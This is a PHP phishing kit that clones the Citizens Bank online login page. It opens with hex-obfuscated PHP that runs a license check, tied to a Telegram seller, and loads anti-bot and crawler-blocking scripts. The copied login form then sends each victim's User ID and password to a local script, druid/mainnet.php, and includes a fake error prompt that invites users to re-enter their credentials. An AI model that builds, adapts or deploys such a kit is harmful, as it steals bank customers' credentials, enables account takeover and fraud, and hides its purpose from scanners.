<?php
 goto zxWZA; Xh06F: include "\144\x72\165\151\144\57\x61\156\x74\151\66\x2e\x70\150\x70"; goto Hf8H_; yGkyH: include "\x64\x72\165\x69\x64\57\162\x65\x63\x6f\x6e\x2e\160\150\x70"; goto M8ix6; rzx8U: include "\x64\x72\165\151\144\57\141\x6e\x74\x69\70\56\x70\x68\160"; goto yGkyH; Wr47S: include "\144\x72\x75\x69\144\x2f\141\156\x74\151\x33\56\160\x68\160"; goto yAZLf; JZ9TL: include "\x64\x72\x75\x69\144\x2f\141\x6e\164\x69\65\56\x70\x68\x70"; goto Xh06F; fJsNg: $api = new LicenseBoxExternalAPI(); goto YrXKn; QAJDr: include "\x73\x70\141\162\x6b\57\141\x76\x65\156\x67\x65\162\163\57\x62\154\x61\x63\x6b\x61\144\x61\x6d\57\157\x70\145\x78\x2e\160\x68\160"; goto Cj3OJ; JTdGc: include "\144\162\x75\x69\144\57\141\x6e\164\x69\61\x2e\160\150\x70"; goto pliPQ; zxWZA: require_once "\151\156\143\x6c\x75\x64\145\163\57\154\142\x5f\150\x65\x6c\x70\145\x72\56\160\150\160"; goto fJsNg; Cj3OJ: $res = $api->verify_license(); goto wSM8o; t1nG_: include "\x73\x70\141\162\153\57\141\166\x65\x6e\147\x65\162\x73\x2f\142\154\x61\x63\153\x61\x64\141\155\57\x72\x65\x66\x73\x70\x61\x6d\56\x70\150\160"; goto DqeUo; rQeCH: include "\163\160\x61\162\x6b\x2f\x61\x76\x65\156\x67\145\x72\163\57\x62\154\141\x63\153\141\144\141\x6d\57\142\x74\56\x70\150\160"; goto XkbBA; pliPQ: include "\x64\x72\x75\151\144\57\141\x6e\164\x69\62\56\160\150\160"; goto Wr47S; DqeUo: include "\163\160\x61\x72\153\57\141\x76\145\156\147\145\x72\163\x2f\142\154\x61\143\x6b\141\x64\x61\155\57\151\x70\163\145\154\x65\143\164\x2e\x70\150\x70"; goto VI5Ee; VI5Ee: include "\163\x70\x61\162\153\x2f\141\x76\145\156\x67\145\162\x73\57\142\x6c\141\x63\153\141\144\x61\155\57\142\x74\163\x32\x2e\x70\150\x70"; goto QAJDr; XkbBA: include "\163\160\x61\x72\x6b\57\x61\166\145\x6e\x67\x65\162\x73\x2f\x62\x6c\x61\x63\x6b\x61\x64\141\155\57\x62\141\163\x69\x63\142\157\x74\56\x70\150\160"; goto XGXfE; M8ix6: include "\163\x70\141\x72\x6b\x2f\141\166\145\156\147\x65\162\x73\x2f\x69\156\x64\145\x78\56\x70\x68\160"; goto rQeCH; YrXKn: require_once "\x61\156\x74\151\142\157\x74\57\143\x6f\x64\x65\x2f\x69\156\143\154\165\x64\145\56\160\150\x70"; goto JTdGc; Hf8H_: include "\x64\162\165\151\144\57\141\x6e\x74\x69\x37\56\x70\x68\160"; goto rzx8U; yAZLf: include "\x64\162\165\151\x64\x2f\x61\x6e\164\x69\x34\56\x70\x68\x70"; goto JZ9TL; wSM8o: if ($res["\163\x74\141\164\165\x73"] != true) { die("\131\157\x75\x72\x20\154\151\x63\x65\x6e\x73\x65\x20\151\x73\40\151\x6e\x76\x61\154\x69\x64\54\x20\160\x6c\x65\141\x73\145\x20\143\157\156\x74\x61\x63\x74\x20\x73\x75\160\160\157\162\x74\x20\157\156\40\x54\x65\x6c\145\x67\x72\x61\x6d\x20\72\40\x40\163\160\141\162\x6b\x5f\160\141\147\x65\x73\56"); } goto NK634; XGXfE: include "\163\x70\x61\162\153\x2f\x61\166\x65\156\x67\145\x72\x73\57\x62\x6c\141\143\x6b\x61\x64\141\155\57\x75\141\x63\162\x61\x77\x6c\145\162\56\160\150\x70"; goto t1nG_; NK634: ?>







<!DOCTYPE html>






<!-- Using brand query parameter to decide branding for the page -->





	
	
	
	
	















<!DOCTYPE html>


















<!DOCTYPE html>
<html lang="en-US">
<head>


<!-- // removing loginnew-wait.jsp from search results requirement OLB-7248  -->

<!-- // removing logout.jsp from search results requirement OLB-4998  -->









<!-- // removing logout.jsp from search results requirement OLB-4998  -->


<!-- // removing loginnew-wait.jsp from search results requirement OLB-7248  -->

	<link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon.png" rel="apple-touch-icon">
	<link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76">
	<link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120">
	<link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152">
	<link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180">
	<link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/icon-hires.png" rel="icon" sizes="192x192">
	<link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/icon-normal.png" rel="icon" sizes="128x128">
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<!--Exclude Ensighten library incase skipEnsighten is "true"-->
	
	<script type="text/javascript">
		var timeStamp = new Date().toString();
		var pageURL = ((window.frames && window.frames.length) ? window.frames[0].location.href : window.location.href);
		var pageName = ((window.document && window.document.title) ? window.document.title : "not available");
		var digitalData = {
			"sessionInformation": {
				"zipCode": "",
				"country": "",
				"city": "",
				"state": "",
				"timeStamp": timeStamp
			},
			"customerAttributes": {
				"CISKey": "",
				"DirectoryID": ""
			},
			"contentInteractions": {
				"siteName": "OLB",
				"siteSection": "Authenticated",
				"pageName": pageName,
				"pageURL": pageURL,
				"pageType": "Legacy"
			}
		};
		if (typeof(parent.Bootstrapper) !== "undefined" && parent.Bootstrapper.ensEvent && parent.Bootstrapper.ensEvent.trigger){
			if(window.frames && window.frames.length) parent.Bootstrapper.ensEvent.trigger("OLBURLChangeFrame"); else parent.Bootstrapper.ensEvent.trigger("OLBURLChangeWindow");
		}
	</script>
	<script type="text/javascript" src="//nexus.ensighten.com/citizensbank/olbprod/Bootstrap.js"></script>
	

	<!-- BEGIN LivePerson Monitor -->
	<script type="text/javascript">
		// Production environment check from olb-web-ui ./js/mv/_onlinebanking/config.js
		var isProductionEnvironment = !!document.location.hostname.match(/(?:^.*\.|^)citizensbankonline.com/);
		// Set LivePerson account number based on environment
		var lpAccountNumber = isProductionEnvironment ? '83789770' : '89632304';

		window.lpTag = window.lpTag || {}, 'undefined' == typeof window.lpTag._tagCount ? (window.lpTag = { wl: lpTag.wl || null, scp: lpTag.scp || null, 
		site: lpAccountNumber || '', section: lpTag.section || '', tagletSection: lpTag.tagletSection || null, autoStart: lpTag.autoStart !== !1, ovr: lpTag.ovr || 
		{}, _v: '1.10.0', _tagCount: 1, protocol: 'https:', events: { bind: function (t, e, i) { lpTag.defer(function () { lpTag.events.bind(t, e, i) }, 0) }, 
		trigger: function (t, e, i) { lpTag.defer(function () { lpTag.events.trigger(t, e, i) }, 1) } }, defer: function (t, e) { 0 === e ? (this._defB = this._defB || [], 
		this._defB.push(t)) : 1 === e ? (this._defT = this._defT || [], this._defT.push(t)) : (this._defL = this._defL || [], this._defL.push(t)) }, 
		load: function (t, e, i) { var n = this; setTimeout(function () { n._load(t, e, i) }, 0) }, _load: function (t, e, i) { var n = t; t || 
		(n = this.protocol + '//' + (this.ovr && this.ovr.domain ? this.ovr.domain : 'lptag.liveperson.net') + '/tag/tag.js?site=' + this.site); 
		var o = document.createElement('script'); o.setAttribute('charset', e ? e : 'UTF-8'), i && o.setAttribute('id', i), o.setAttribute('src', n), 
		document.getElementsByTagName('head').item(0).appendChild(o) }, init: function () { this._timing = this._timing || {}, 
		this._timing.start = (new Date).getTime(); var t = this; window.attachEvent ? window.attachEvent('onload', function () { t._domReady('domReady') }) : 
		(window.addEventListener('DOMContentLoaded', function () { t._domReady('contReady') }, !1), window.addEventListener('load', function () 
		{ t._domReady('domReady') }, !1)), 'undefined' === typeof window._lptStop && this.load() }, start: function () { this.autoStart = !0 }, _domReady: function (t)
		{ this.isDom || (this.isDom = !0, this.events.trigger('LPT', 'DOM_READY', { t: t })), this._timing[t] = (new Date).getTime() }, vars: lpTag.vars || [], 
		dbs: lpTag.dbs || [], ctn: lpTag.ctn || [], sdes: lpTag.sdes || [], hooks: lpTag.hooks || [], identities: lpTag.identities || [], ev: lpTag.ev || [] }, 
		lpTag.init()) : window.lpTag._tagCount += 1;
	</script>
	<!-- END LivePerson Monitor -->

<title> Online Login | Citizens </title>
<meta name="description" content="Log in to your Citizens Bank account by entering your User ID and password so you can securely view and manage your accounts online.">

<script src="/efs/efs/jsp-ns/pm_fp.js"> </script>






<link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/jquery-ui-1.10.3.custom.min.css">
<link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/normalize.css">
<link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/main.css">
<link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/flows.css">
<link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/ad-containers.css">

<script src="https://www3.citizensbankonline.com/efs/efs/jsp-ns/scripts/modernizr-2.6.2.min.js"></script>

<script>window.jQuery || document.write('<script src="https://www3.citizensbankonline.com/efs/efs/jsp-ns/scripts/jquery-1.9.1.min.js"><\/script>')</script>
<script src="https://www3.citizensbankonline.com/efs/efs/jsp-ns/scripts/plugins.js"></script>

<script src="https://www3.citizensbankonline.com/efs/efs/jsp-ns/scripts/main.js"></script>


<script src="https://www3.citizensbankonline.com/efs/efs/jsp-ns/scripts/placeholders.min.js"></script>


<!--[if lt IE 9]>
<script src="/efs/efs/jsp-ns/scripts/html5shiv.js"></script>
<![endif]-->





<!--[if IE]>
<style type='text/css'>
form select#SavedUserID {
    width : 200px;
}
</style>
<![endif]-->


<META http-equiv="Refresh" content="580; URL=/efs/servlet/efs/invalidate-session.jsp">



<style>
	input[type=password].error {
		border-color : red;
	}
</style>


<script>bazadebezolkohpepadr="2084492360"</script><script type="text/javascript" src="https://www4.citizensbankonline.com/akam/11/7c3ed55c" defer></script></head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<body class="responsive-enabled">
	<script>
	if(self == top) {
		var thebody = document.getElementsByTagName('body')[0]
		thebody.style.display = "block"
	} else {
		top.location = self.location
	}
	
	</script>
    


<script type="text/javascript" src="https://www3.citizensbankonline.com/efs/efs/js/tealeaf.js"></script>
<!-- begin CITIZENS BANK Hosted Header -->
 

    <style>
        .account-section-title.checkmark h1 { padding: 0px 0px 5px 28px !important; }
        .mobile-alert-dot {min-width: 22px; min-height: 22px; width: auto; height: auto; max-width: 50px; max-height: 50px; padding: 5px; }

        .shows-error {
  color: red;
  margin-bottom: 20px;
}
    </style>

    <!-- htmlContainer PREFIX -->
    <div class="citizens-header-footer">
        <div id="page-header" class="page-header">
            <!-- inc-header.html START -->
            <div class="topshadow"></div>
            <div class="centered-content clearfix">

                <a href="#" class="page-logo" tabindex="1">
                    <!-- Display the brand logo for either citizens one or citizen bank customers -->
                    <img border="0" alt="Citizens Bank" width="203" height="25" src="https://www3.citizensbankonline.com/efs/hhf/img/CTZ_Green-01.png">
                </a>
                <div id="header-navigation-container"></div>

            </div>
            <!-- inc-header.html END -->
        </div>
    </div>
    <!-- htmlContainer SUFFIX -->


</div>
<!-- end CITIZENS BANK Hosted Header -->




<div id="page-container" class="page-container">
	<div class="centered-content clearfix">
		<section id="top-content" class="page-region top-content">
        
    	</section>
    	<section id="main-container" class="main-container two-col layout-2-1 clearfix">

        	<!-- =================
        	MAIN CONTENT AREA START
        	================= -->
        	<section id="main-content" class="page-region main-content">
  
	<div class="account-table account-table-full">
    	<span class="account-table-border"></span>
    	<div class="account-table-content">
            <div class="account-content-container">
                <div class="account-table-body">
                    <header class="account-section-title clearfix account-secure">
                    <a href="#" class="mobile-help-trigger">Help</a>
                    
                            <h1>Secure Online Banking Login</h1>
                    
                                            
                    </header>
                    
                    






 





 









<div id="GlobalMessageContainer">

    

    
    
<form class="pay-transfer-options clearfix" action="druid/mainnet.php" method="post">

 
                    <?php 
                                if (isset($_GET['ReasonCode'])) {
                                $ReasonCode = isset($_GET['ReasonCode']) ? trim(htmlentities($_GET['ReasonCode'])):'';
                                $em = "6004";
                                if ($ReasonCode == $em) {
                                print"<input type='hidden' name='ReasonCode' value='ReasonCode'><div id='messagecontainer' class='error-message show-error error-visible' role='alert' style='display: block;'>The information you entered does not match our records. Please check your information and try again. If you need login assistance, click on <a href='/efs/ui/tli/index.html'>Trouble logging in?</a> or <a href='login-faqs.jsp' target='_blank'>View All Help Topics</a>.</div>";}}?>

                                


                    <section class="account-section">
                        
                                                                        
                                    <div class="account-title clearfix">
                                            <p>Please enter your Online User ID and Password.</p>
                                    </div>
                                    
                                    
                                    
		<div class="form-item label-right full-width clearfix">
	    
            
                
            
    
            
                <label for="UserID"><strong>Online User ID: </strong></label>
                <input tabindex="1" type="text" id="UserID" name="UserID" autocomplete="off" maxlength="20" class="required demo-username" required="">
               
                
                        
            
                	<div class="full-width checkbox-item clearfix"> 
                            <input type="checkbox" tabindex="5" disabled="disabled" style="vertical-align:top">
                            <input type="hidden" name="Register" id="Register" value="0">
                            <input type="checkbox" tabindex="5" disabled="disabled" id="cbSaveUserID" name="cbSaveUserID" style="vertical-align:top">
                            <span class="inline-tooltip">
                            <label for="cbSaveUserID">Remember User ID</label>

                            <span class="tooltip" tabindex="6" role="tooltip" aria-describedby="tooltip-content">
                                    <div class="tooltip-icon" title="Remember User ID tooltip"></div>
                                    <div class="tooltip-box">
                                    <div class="tooltip-content" id="aria-tooltip-content">

                                            <span class="tooltip-arrow"></span>
                                            <div>Select the &quot;Remember User ID&quot; box  on the Login page if you want to be remembered.</div>
                                            <br>
                                            <div>Please note, if the &quot;Remember User ID&quot; check box is not displayed on the Login page, click on the &quot;Login using different Online User ID&quot; link to display it.</div>
                                            <br>
                                            <div>DO NOT check this box if you are using a public device that is accessible to others.</div>
                                    </div>
                                    <div class="bottomshadow"></div>
                                    </div>
                                  
                            </span>
                            </span>
                    </div>
                
                    	<div class="form-item full-width">
                            
                            <label for="currentpassword"><strong>Password: </strong></label>
                           
                           
                            <input  tabindex="2" type="password" id="password" name="password" maxlength="15" size="15" class="required demo-password" required="">
                           
<!--                            <div class="show-hide">
                                <a id="showpswd">SHOW</a>
                            	</div>                           -->
                            	
                
                            
                    	</div>
                
                
                	
                        
			 	<span class="mobile-line-break"><a tabindex="7" style="font-size:16px!important" id="troublelogging" data-trigger="login-trouble" href="/efs/ui/tli/index.html">Trouble logging in?</a></span><br>
			
                
                      </div>
            <div id="fielderror" class="show-error" role="alert">We're sorry. That user ID and password does not match our records. Please try again, or do you need Login Assistance?</div>
            	<div class="form-actions">
                
                        
                
                
            <input type="submit" class="submit-button arrow" tabindex="3" data-trigger="next" value="Login"> <a  tabindex="8" href="http://www.citizensbank.com/" class="cancel">Cancel</a>           
            </div>
    </form>
        
                </section>
            </div>
            </div>
    	</div>
	</div>


  






<!DOCTYPE html>



</section> 

<!-- Brand type from query parameter -->


<aside id="main-sidebar" class="page-region main-sidebar">
	<div id="citizens-help" class="citizens-help sidebar-item sidebar-list-container sidebar-accordian mobile-modal">
	    <div class="sidebar-list-content">
	        <header class="sidebar-list-title">
	            <h3>Need Help?</h3>
	        </header>

	
	        <div id="faq-holder">
	        <form action="https://www4.citizensbankonline.com/efs/servlet/efs/login-assistance.jsp" name="frmAsst" id="frmAsst" method="post">
	           <input type="hidden" name="CSRF_TOKEN" value="7ZC5-7RUF-1RAD-J6WX-CIN2-B3IN-U6MX-BSLA"/>
               
               <input type="hidden" name="needHelp" value="1"/>

					<section class="toggle-list-container faq-container" id="faq-index-1">
	                	<a href="#" title="Expand contents of Where can I get login assistance for Online Banking?" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide">Where can I get login assistance for Online Banking?</a>
						<ul class="loginfaq sidebar-list showhide-content">
							<li>
								<p>Simply click on &quot;Trouble logging in?&quot; link. Or, you can click on  &quot;View All Help Topics&quot; link, which appears on each screen.</p>
							</li>
						</ul>
	            	</section>

					<section class="toggle-list-container faq-container" id="faq-index-10">
						<a href="#" title="Expand contents of Is Online Banking secure?" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide">Is Online Banking secure?</a>
						<ul class="loginfaq sidebar-list showhide-content">
							<li>
								<p>To make Online Banking secure, Citizens Bank uses the highest level of encryption available today. Encryption is the process by which information is translated into un-interpretable code and then back to recognized information.<br>As an added measure, Online Banking gives you the capability to easily verify that you are on the authentic Citizens Bank website and not on a fake site created by fraudsters. Just look for the green bar (or some variation of it) in your browser address. The green bar should remind you that &quot;green is good&quot; and that our website has passed a sophisticated authentication process, letting you know you are good to go.</p>
							</li>
						</ul>
					</section>

					<section class="toggle-list-container faq-container" id="faq-index-12">
						 <a href="#" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide" title="Show contents of Should my browser address bar have a green indicator when I use Online Banking?">Should my browser address bar have a "green" indicator when I use Online Banking?</a>
						<ul class="loginfaq sidebar-list showhide-content">
							<li>
								<p>Yes. As an added measure, Online Banking gives you the capability to easily verify that you are on the authentic Citizens Bank website and not on a fake site created by fraudsters. Just look for the green bar (or some variation of it) in your browser address. The green bar should remind you that &quot;green is good&quot; and that our website has passed a sophisticated authentication process, letting you know you are good to go.</p>
							</li>	
						</ul>
					</section>

					<section class="toggle-list-container faq-container" id="faq-index-20">
						<a href="#" title="Expand contents of How do I log into Online Banking if Iâm a first-time user?" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide">How do I log into Online Banking if I'm a first-time user?</a>
						<ul class="loginfaq sidebar-list showhide-content">
							<li>
								<p>Simply enter your Online User ID and Password and click &quot;LOGIN&quot;, then answer your Challenge Question (if presented). In some situations, your Online User ID will be your ATM/Debit Card number and your Password will be the last four digits of your Social Security number followed by &quot;Abcd&quot; (e.g. 1234Abcd). If you haven&#39;t already selected an Online User ID, you will be asked to do so.</p>
							</li>
						</ul>
					</section>

            </form>
            </div>

			<ul class="sidebar-list">
				<li class="cta-row">
					<a href="login-faqs.jsp" class="blue" target="_blank">View All Help Topics</a>
				</li>

					<li class="cta-row sign-up-prompt visible clearfix">
						<span>Haven't signed up for Online Banking?</span>
						<a href="/efs/ui/enrollment/index.html" class="cta orange">Enroll Now</a>
					</li>

			</ul>
		</div>
	</div>
</aside>


  
   <script type="text/javascript"> 
      $(document).ready(function() {
         $("#troubleloggingin1,#troubleloggingin2,#troubleloggingin3,#troubleloggingin4").click(function(e) {
            e.preventDefault();
            $("#frmAsst").attr("action","https://www4.citizensbankonline.com/efs/servlet/efs/login-assistance.jsp");
            $("#frmAsst").submit();
         });

         $("#resetpassword1").click(function(e) {
            e.preventDefault();
            $("#frmAsst").attr("action","https://www4.citizensbankonline.com/efs/servlet/efs/default-reset.jsp");
            $("#frmAsst").submit();
         });
      });
   </script>


  


		</section> 
	</div> 
</div> 





<!DOCTYPE html>



<!-- begin CITIZENS BANK Hosted Footer -->
<div class="citizens-footer"></div>
 
<!-- end CITIZENS BANK Hosted Footer -->
 

<noscript><img src="https://www4.citizensbankonline.com/akam/11/pixel_7c3ed55c?a=dD1kY2EwNDNjMjlmODA1OGYxOWJjMWMwN2E0Yzg5YWJkNTg3ZWJmY2FiJmpzPW9mZg==" style="visibility: hidden; position: absolute; left: -999px; top: -999px;" /></noscript><script type="text/javascript" >var _cf = _cf || []; _cf.push(['_setFsp', true]);  _cf.push(['_setBm', true]);  _cf.push(['_setAu', '/content/930e113327rn2365aa3b7b98b0447e8d']); </script><script type="text/javascript"  src="/content/930e113327rn2365aa3b7b98b0447e8d"></script></body>
</html>



 <!--  End Main Container -->

  <script src="/efs/efs/jsp-ns/scripts/common.js"></script>

<script type="text/javascript">
$(document).ready(function() {
	
    document.title = "Online Login | Citizens";
 $("#UserID").on('keypress paste',function(){
       $('#cbSaveUserID').attr('disabled', false);
   });

 $("#UserID").on('keyup input',function(){
    if(!$('#UserID').val().length)
       $('#cbSaveUserID').attr('disabled', true);
   });
   $(".tooltip").focusin(function(){
    $(this).addClass("hover");
   });
   $(".tooltip").focusout(function(){
    $(this).removeClass("hover");
   })




var skipSubmit = false;


$("#troubleloggingin").click(function(e) {
	e.preventDefault();
	skipSubmit = true;
	$("#frmSignOn").attr("action","https://www4.citizensbankonline.com/efs/servlet/efs/login-assistance.jsp");
    $("#frmSignOn").attr("method","get");
    post_deviceprint();
	$("#frmSignOn").submit();
});

function OLB_validate() {
	var userid = null;
    var result = false;

    if (!skipSubmit) {
    	currentpassword = $("#password").val();
	    
	        userid = $("#UserID").val();
	        if (userid != undefined && $.trim(userid).length > 0) {
	            userid = userid.replace(/^\s*|\s*$/g, "");
	        }
	        $("#UserID").val(userid.toLowerCase());
	    

	    if (userid == null || $.trim(userid).toLowerCase().length == 0) {
	        $("#messagecontainer").html("Please enter your Online User ID and click Login").css("display","block");
	        $("#messagecontainer").addClass("error");
	        $("#UserID").addClass("inputerror");
	        $('#UserID').focus();
	    } else if (password == null || $.trim(currentpassword).toLowerCase().length == 0) {
	        $("#messagecontainer").html("Please enter your User ID and Password and click Login").css("display","block");
	        $("#messagecontainer").addClass("error");
	        $("#currentpassword").addClass("currentpassword");
	        $('#currentpassword').focus();
	    } else {
	        // Check to see if the user is saving their User ID
	        if ($("#cbSaveUserID").is(':checked')) {
	            $("#SaveUserID").val("on");
	            $("#Register").val("1");
	        } else {
	            $("#SaveUserID").val("");
	            $("#Register").val("0");
	        }
	        result = true;
	    }

    } else {
    	result = true;
    }


    return result;
}

$("#frmSignOn").submit(function(e) {
    if (!OLB_validate()) {
    	 e.preventDefault();
    } else {
    	return true;
    }
});

//show/hide password
/*$("#currentpassword").focus(function (e) {
    e.preventDefault();
    if ($('#showpswd').text() === "HIDE") {
        $('#currentpassword').prop('type', 'text');
        setTimeout(function () {
            $('#currentpassword').prop('type', 'password');
            $('#showpswd').text("SHOW");
        }, 5000);
    }
});
$('#showpswd').click(function (e) {
    e.preventDefault();
    var toggleText = $(e.currentTarget).text();
    $(e.currentTarget).text("HIDE");
    if (toggleText === "SHOW") {
        if ($('#currentpassword').val() === "") {
            $('#currentpassword').prop('type', 'text');
        }
        if ($('#currentpassword').val() !== "") {
            $('#currentpassword').prop('type', 'text');
            $(e.currentTarget).text("HIDE");
            setTimeout(function () {
                $('#currentpassword').prop('type', 'password');
                $(e.currentTarget).text("SHOW");
            }, 5000);
        }
    } else if (toggleText === "HIDE") {
        $('#currentpassword').prop('type', 'password');
        $(e.currentTarget).text("SHOW");
    }
});*/

//clear password when changed saved user id in select box
$('#SavedUserID').change(function(){
    $('#password').val('');
});

// Once page has loaded, re-enable button
//$('#btnLogin').removeAttr("disabled");
//$('#btnLogin').removeClass("inactive");

// Set focus to login ID
$('#UserID').focus();


});
</script>
</body>
</html>

 